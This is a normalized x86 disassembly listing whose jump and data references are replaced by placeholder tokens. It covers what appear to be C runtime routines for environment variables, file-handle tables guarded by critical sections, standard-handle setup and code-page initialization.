mov [ ebp - 0x1 ] al
cmp esi [ rw-data ]
jne r-xdata
xor ebx ebx
test esi esi
jne r-xdata
push esi
call sub_438794
mov esi eax
mov al [ ebp - 0x1 ]
pop ecx
mov [ rw-data ] esi
mov eax [ ebp - 0xc ]
mov ecx edi
sub eax ecx
push eax
push ecx
call sub_438903
mov [ ebp - 0x8 ] eax
pop ecx
pop ecx
test eax eax
js r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ esi ] ebx
je r-xdata
test al al
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push edi
call sub_42d3b1
pop ecx
pop edi
mov eax ebx
pop esi
neg eax
mov [ ebp - 0x8 ] eax
lea ecx [ eax + 0x2 ]
cmp ecx eax
jb r-xdata
push [ esi + eax * 4 ]
call sub_42d3b1
pop ecx
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x1 ] bl
jne r-xdata
push 0x4
push 0x1
call sub_42d49d
push ebx
mov [ rw-data ] eax
call sub_42d3b1
mov esi [ rw-data ]
add esp 0xc
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
call j_sub_42a6ce#2
test eax eax
jne r-xdata
or ebx 0xffffffff
cmp ecx 0x3fffffff
jae r-xdata
cmp [ esi + ecx * 4 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edi ebx
mov [ esi + ecx * 4 ] eax
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ rw-data ]
push 0x4
push ecx
push esi
call sub_43bc1c
push ebx
mov esi eax
call sub_42d3b1
add esp 0x10
test esi esi
je r-xdata
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ esi + ecx * 4 ] eax
inc ecx
push 0x4
push ecx
push esi
call sub_43bc1c
push ebx
mov esi eax
call sub_42d3b1
add esp 0x10
mov eax edi
test esi esi
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
test esi esi
je r-xdata
push 0x4
push 0x1
call sub_42d49d
push ebx
mov [ rw-data ] eax
call sub_42d3b1
add esp 0xc
cmp [ rw-data ] ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edi ebx
mov eax [ ebp + 0x8 ]
mov [ esi + ecx * 4 ] eax
mov [ esi + ecx * 4 + 0x4 ] ebx
jmp r-xdata
mov ecx eax
lea edx [ ecx + 0x1 ]
mov [ rw-data ] esi
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push 0x1
lea eax [ ecx + 0x2 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
call sub_42d3b1
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
push esi
call sub_42d2ce
add esp 0xc
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_430e5d
int3
mov ecx [ ebp - 0xc ]
mov eax esi
sub eax [ ebp + 0x8 ]
inc ecx
add ecx eax
movzx eax [ ebp - 0x1 ]
neg eax
sbb eax eax
not eax
mov [ ecx - 0x1 ] bl
and eax ecx
push eax
push esi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
call sub_430f56
or ebx 0xffffffff
mov [ eax ] 0x2a
sub_438557
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
push 0x3d
push ebx
mov edi ebx
call sub_44c17b
mov [ ebp - 0xc ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
cmp eax ebx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ rw-data ]
xor ebx ebx
cmp [ eax + 0x2 ] bx
sete cl
mov [ ebp - 0x1 ] cl
cmp esi [ rw-data ]
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_438845
pop ecx
mov cl [ ebp - 0x1 ]
mov esi eax
mov [ rw-data ] esi
mov ecx [ ebp - 0xc ]
mov eax edi
sub ecx eax
sar ecx 0x1
push ecx
push eax
mov [ ebp - 0xc ] ecx
call sub_438957
mov [ ebp - 0x8 ] eax
pop ecx
pop ecx
test eax eax
js r-xdata
mov eax [ rw-data ]
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ esi ] ebx
je r-xdata
test cl cl
jne r-xdata
test eax eax
je r-xdata
push edi
call sub_42d3b1
pop ecx
pop edi
mov eax ebx
pop esi
neg eax
mov [ ebp - 0x8 ] eax
lea ecx [ eax + 0x2 ]
cmp ecx eax
jb r-xdata
push [ esi + eax * 4 ]
call sub_42d3b1
pop ecx
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x1 ] bl
jne r-xdata
test eax eax
jne r-xdata
call j_sub_42a6fd#2
test eax eax
jne r-xdata
or ebx 0xffffffff
cmp ecx 0x3fffffff
jae r-xdata
cmp [ esi + ecx * 4 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edi ebx
mov [ esi + ecx * 4 ] eax
jmp r-xdata
push 0x4
push 0x1
call sub_42d49d
push ebx
mov [ rw-data ] eax
call sub_42d3b1
add esp 0xc
push 0x4
push 0x1
call sub_42d49d
push ebx
mov [ rw-data ] eax
call sub_42d3b1
add esp 0xc
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push 0x4
push ecx
push esi
call sub_43bc1c
push ebx
mov esi eax
call sub_42d3b1
add esp 0x10
test esi esi
je r-xdata
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ esi + ecx * 4 ] eax
inc ecx
push 0x4
push ecx
push esi
call sub_43bc1c
push ebx
mov esi eax
call sub_42d3b1
add esp 0x10
mov eax edi
test esi esi
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi ebx
mov eax [ ebp + 0x8 ]
mov [ esi + ecx * 4 ] eax
mov [ esi + ecx * 4 + 0x4 ] ebx
jmp r-xdata
mov ecx eax
lea edx [ ecx + 0x2 ]
mov [ rw-data ] esi
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x2
lea eax [ ecx + 0x2 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
call sub_42d3b1
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
push [ ebp - 0x8 ]
push esi
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_430e5d
int3
mov ecx [ ebp - 0xc ]
inc ecx
lea ecx [ esi + ecx * 2 ]
mov [ ecx - 0x2 ] ax
movzx eax [ ebp - 0x1 ]
neg eax
sbb eax eax
not eax
and eax ecx
push eax
push esi
call [ SetEnvironmentVariableW@IAT ]
test eax eax
jne r-xdata
call sub_430f56
or ebx 0xffffffff
mov [ eax ] 0x2a
sub_438794
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
xor ecx ecx
mov eax edi
cmp [ edi ] ecx
je r-xdata
xor eax eax
jmp r-xdata
push esi
lea eax [ ecx + 0x1 ]
push 0x4
push eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] 0x0
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
call sub_42d45a
cmp [ edi ] 0x0
je r-xdata
push 0x0
call sub_42d3b1
pop ecx
mov eax esi
pop esi
push ebx
mov ebx esi
sub ebx edi
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push 0x1
lea eax [ ecx + 0x1 ]
push eax
mov [ ebp - 0x4 ] eax
call sub_42d49d
push 0x0
mov [ ebx + edi ] eax
call sub_42d3b1
add esp 0xc
cmp [ ebx + edi ] 0x0
je r-xdata
push [ edi ]
push [ ebp - 0x4 ]
push [ ebx + edi ]
call sub_42d2ce
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
add edi 0x4
cmp [ edi ] eax
jne r-xdata
mov ecx [ edi ]
lea edx [ ecx + 0x1 ]
pop ebx
sub_438845
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push ebx
xor ebx ebx
mov eax edi
mov ecx ebx
mov [ ebp - 0x4 ] ebx
push esi
cmp [ edi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ecx + 0x1 ]
push 0x4
push eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] ebx
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
call sub_42d45a
cmp [ edi ] ebx
je r-xdata
push ebx
call sub_42d3b1
pop ecx
mov eax esi
pop esi
pop ebx
mov ebx esi
sub ebx edi
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x4 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x2
lea eax [ ecx + 0x1 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_42d49d
mov [ ebx + edi ] eax
xor eax eax
push eax
call sub_42d3b1
add esp 0xc
cmp [ ebx + edi ] 0x0
je r-xdata
push [ edi ]
push [ ebp - 0x8 ]
push [ ebx + edi ]
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
add edi 0x4
cmp [ edi ] eax
jne r-xdata
mov ecx [ edi ]
lea edx [ ecx + 0x2 ]
xor ebx ebx
sub_438903
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
mov esi edi
cmp [ edi ] 0x0
je r-xdata
sub esi edi
sar esi 0x2
neg esi
mov ebx [ ebp + 0xc ]
add esi 0x4
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov al [ ebx + eax ]
cmp al 0x3d
je r-xdata
push ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_443fe0
add esp 0xc
test eax eax
jne r-xdata
sub esi edi
sar esi 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_438957
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
mov esi edi
cmp [ edi ] 0x0
je r-xdata
sub esi edi
sar esi 0x2
neg esi
mov ebx [ ebp + 0xc ]
add esi 0x4
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
movzx eax [ eax + ebx * 2 ]
cmp eax 0x3d
je r-xdata
push ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_443de3
add esp 0xc
test eax eax
jne r-xdata
sub esi edi
sar esi 0x2
jmp r-xdata
test ax ax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_4389e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
movsx ecx [ eax ]
mov eax [ ebp + 0x8 ]
push ecx
push [ eax ]
call sub_44c050
pop ecx
pop ecx
pop ebp
retn
sub_438a00
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
movsx ax [ eax ]
movzx ecx ax
mov eax [ ebp + 0x8 ]
push ecx
push [ eax ]
call sub_44c17b
pop ecx
pop ecx
pop ebp
retn
sub_438a1e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42d2ce
add esp 0xc
pop ebp
retn
sub_438a3c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436420
add esp 0xc
pop ebp
retn
sub_438a5a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42d2ce
add esp 0xc
pop ebp
retn
sub_438a78
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436420
add esp 0xc
pop ebp
retn
sub_438a96
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_438aae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
pop ebp
retn
sub_438acc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_443fe0
add esp 0xc
pop ebp
retn
sub_438aea
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_443de3
add esp 0xc
pop ebp
retn
sub_438bb7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
push 0x30
push 0x40
call sub_42d49d
mov edi eax
xor ebx ebx
mov [ ebp - 0x8 ] edi
pop ecx
pop ecx
test edi edi
jne r-xdata
lea eax [ edi + 0xc00 ]
cmp edi eax
je r-xdata
mov edi ebx
jmp r-xdata
push ebx
call sub_42d3b1
pop ecx
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + 0x20 ]
mov edi eax
push ebx
push 0xfa0
lea eax [ esi - 0x20 ]
push eax
call sub_42fd88
or [ esi - 0x8 ] 0xffffffff
mov [ esi ] ebx
lea esi [ esi + 0x30 ]
mov [ esi - 0x2c ] ebx
lea eax [ esi - 0x20 ]
mov [ esi - 0x28 ] 0xa0a0000
mov [ esi - 0x24 ] 0xa
and [ esi - 0x23 ] 0xf8
mov [ esi - 0x22 ] bl
cmp eax edi
jne r-xdata
mov edi [ ebp - 0x8 ]
pop esi
sub_438c31
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push ebx
lea ebx [ esi + 0xc00 ]
push edi
mov edi esi
cmp esi ebx
je r-xdata
push esi
call sub_42d3b1
pop ecx
pop edi
pop ebx
push edi
call [ DeleteCriticalSection@IAT ]
add edi 0x30
cmp edi ebx
jne r-xdata
sub_438c66
push 0x14
push r--data
call sub_40d270
cmp [ ebp + 0x8 ] 0x2000
sbb eax eax
neg eax
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push 0x7
call sub_42f07b
pop ecx
mov [ ebp - 0x4 ] esi
mov edi esi
mov eax [ rw-data ]
call sub_430f56
push 0x9
pop esi
mov [ eax ] esi
call sub_430e30
mov [ ebp - 0x4 ] 0xfffffffe
call sub_438cf5
jmp r-xdata
cmp [ edi * 4 + rw-data ] esi
jne r-xdata
mov eax esi
call sub_40d2b6
retn
inc edi
jmp r-xdata
call sub_438bb7
mov [ edi * 4 + rw-data ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ rw-data ]
add eax 0x40
mov [ rw-data ] eax
push 0xc
pop esi
mov [ ebp - 0x1c ] esi
sub_438cfe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_438d21
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
and [ eax ] 0x0
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov eax esi
mov ebx esi
and eax 0x3f
sar ebx 0x6
imul ecx eax 0x30
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x4 ] ecx
cmp [ ecx + eax + 0x18 ] 0xffffffff
jne r-xdata
push edi
call sub_429dd0
mov edi [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax + 0x18 ] edi
xor eax eax
pop edi
jmp r-xdata
sub esi 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0xfffffff6
sub esi 0x1
je r-xdata
push edi
push 0xfffffff5
jmp r-xdata
sub esi 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
push edi
push 0xfffffff4
jmp r-xdata
sub_438db5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_438dd8
push 0x1c
push r--data
call sub_40d270
push 0x7
call sub_42f07b
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_438ee1
mov eax edi
call sub_40d2b6
retn
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
lea ecx [ eax + 0xc00 ]
mov [ ebp - 0x20 ] ecx
mov esi eax
push 0x30
pop eax
call sub_438bb7
mov [ ebx * 4 + rw-data ] eax
test eax eax
je r-xdata
inc ebx
jmp r-xdata
test [ esi + 0x28 ] 0x1
jne r-xdata
add [ rw-data ] 0x40
mov edi ebx
shl edi 0x6
push edi
call sub_438cfe
pop ecx
mov edx edi
sar edx 0x6
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov [ eax + ecx + 0x28 ] 0x1
mov [ ebp - 0x2c ] ebx
cmp ebx 0x80
jge r-xdata
add esi eax
jmp r-xdata
push esi
call [ EnterCriticalSection@IAT ]
test [ esi + 0x28 ] 0x1
je r-xdata
mov [ ebp - 0x24 ] esi
cmp esi ecx
je r-xdata
sub esi [ ebp - 0x28 ]
mov eax esi
cdq
push 0x30
pop ecx
idiv ecx
shl ebx 0x6
lea esi [ ebx + eax ]
mov edx esi
sar edx 0x6
mov ecx esi
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x28 ] 0x1
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x18 ] edi
mov edi esi
jmp r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0x20 ]
push 0x30
pop eax
mov [ ebp - 0x1c ] edi
sub_438eea
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
js r-xdata
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
and [ eax ] 0x0
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov eax esi
mov edi esi
and eax 0x3f
sar edi 0x6
imul ebx eax 0x30
mov eax [ edi * 4 + rw-data ]
test [ ebx + eax + 0x28 ] 0x1
je r-xdata
cmp [ ebx + eax + 0x18 ] 0xffffffff
je r-xdata
call sub_429dd0
cmp eax 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ ebx + eax + 0x18 ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub esi eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
push 0xfffffff6
sub esi 0x1
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
sub esi 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_438f7b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
call sub_430e30
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
mov eax [ eax + ecx + 0x18 ]
pop ebp
retn
sub_438fe5
push 0x10
push r--data
call sub_40d270
xor bl bl
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x4000
je r-xdata
add bl 0x20
test [ ebp + 0xc ] 0x80
je r-xdata
or bl 0x80
push [ ebp + 0x8 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_430f20
pop ecx
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
call sub_40d2b6
retn
call sub_438dd8
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi 0xffffffff
jne r-xdata
or bl 0x8
mov [ ebp - 0x19 ] 0x0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push esi
call sub_438d21
pop ecx
pop ecx
or bl 0x1
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x28 ] bl
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x29 ] 0x0
mov eax [ edx * 4 + rw-data ]
and [ ecx + eax + 0x2d ] 0xfe
mov al 0x1
mov [ ebp - 0x19 ] al
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4390ce
mov eax esi
call sub_430f56
mov [ eax ] 0x18
call sub_430f43
and [ eax ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
sub_4390ce
test al al
jne r-xdata
push esi
call sub_438db5
pop ecx
retn
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_4390f9
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_430a7e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ba8
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax ]
mov esp ebp
pop ebp
retn
sub_4391bd
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_430a7e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ba8
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
sub_4391e4
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_430a7e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ba8
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x10 ]
mov esp ebp
pop ebp
retn
sub_43920b
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_430a7e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ba8
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
add eax 0xa0
mov esp ebp
pop ebp
retn
sub_439234
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_430a7e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ba8
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x4 ]
mov esp ebp
pop ebp
retn
sub_439274
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x1c ] ebx
mov ecx [ esi + 0xa8 ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x44 ] ebx
test ecx ecx
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] ebx
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0x8c ] ebx
xor eax eax
mov [ esi + 0x90 ] ebx
mov [ esi ] r--data
mov [ esi + 0x94 ] r--data
mov [ esi + 0x98 ] r--data
mov [ esi + 0x4 ] 0x1
[ eax ]
push 0x4
push 0x1
call sub_42d49d
push ebx
mov [ ebp - 0x28 ] eax
call sub_42d3b1
push 0x2
mov edi 0x180
push edi
call sub_42d49d
push ebx
mov [ ebp - 0x1c ] eax
call sub_42d3b1
push 0x1
push edi
call sub_42d49d
push ebx
mov [ ebp - 0x20 ] eax
call sub_42d3b1
push 0x1
push edi
call sub_42d49d
push ebx
mov [ ebp - 0x24 ] eax
call sub_42d3b1
push 0x1
push 0x101
call sub_42d49d
mov edi eax
push ebx
mov [ ebp - 0x30 ] edi
call sub_42d3b1
add esp 0x3c
cmp [ ebp - 0x28 ] ebx
je r-xdata
push eax
push 0x1004
push ecx
lea eax [ ebp - 0x48 ]
push ebx
push eax
call sub_4441ce
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x28 ]
call sub_42d3b1
push [ ebp - 0x1c ]
call sub_42d3b1
push [ ebp - 0x20 ]
call sub_42d3b1
push [ ebp - 0x24 ]
call sub_42d3b1
xor ebx ebx
add esp 0x10
inc ebx
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
mov eax ebx
mov [ eax + edi ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x8 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax 0x5
ja r-xdata
push ebx
push [ esi + 0x8 ]
movzx eax ax
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x2c ] eax
mov edx 0xff
mov eax [ ebp - 0x20 ]
push edx
add eax 0x81
push eax
push edx
push ecx
push 0x100
push [ esi + 0xa8 ]
push ebx
call sub_43f42d
add esp 0x24
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx 0xff
push ebx
push [ esi + 0x8 ]
add eax 0x81
push ecx
push eax
push ecx
lea eax [ edi + 0x1 ]
push eax
push 0x200
push [ esi + 0xa8 ]
push ebx
call sub_43f42d
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x2c ] 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push [ esi + 0x8 ]
add eax 0x100
push eax
push 0x100
push edi
push 0x1
push ebx
mov [ ebp - 0x38 ] eax
call sub_43a483
add esp 0x1c
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov edx [ ebp - 0x1c ]
xor ecx ecx
lea eax [ edx + 0xfe ]
mov [ eax ] cx
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
mov [ ecx + 0x7f ] bl
sub ecx 0xffffff80
cmp [ ebp - 0x2c ] 0x1
mov [ eax + 0x7f ] bl
mov [ ebp - 0x40 ] ecx
mov [ ecx ] bl
lea ecx [ eax + 0x80 ]
mov [ ebp - 0x34 ] ecx
mov [ ecx ] bl
jle r-xdata
lea ecx [ ebp - 0x11 ]
push 0x3f
pop ecx
lea esi [ edx + 0x200 ]
mov edi edx
[ edi ] [ esi ]
mov edx [ ebp - 0x20 ]
push 0x1f
pop ecx
movsw [ edi ] [ esi ]
lea esi [ edx + 0x100 ]
mov edi edx
[ edi ] [ esi ]
push 0x1f
pop ecx
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea esi [ eax + 0x100 ]
mov edi eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi [ ebp - 0x3c ]
mov ecx [ esi + 0x8c ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
movzx edx [ ecx - 0x1 ]
movzx eax al
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ eax ] 0x1
mov [ esi + 0x8c ] eax
mov eax [ ebp - 0x38 ]
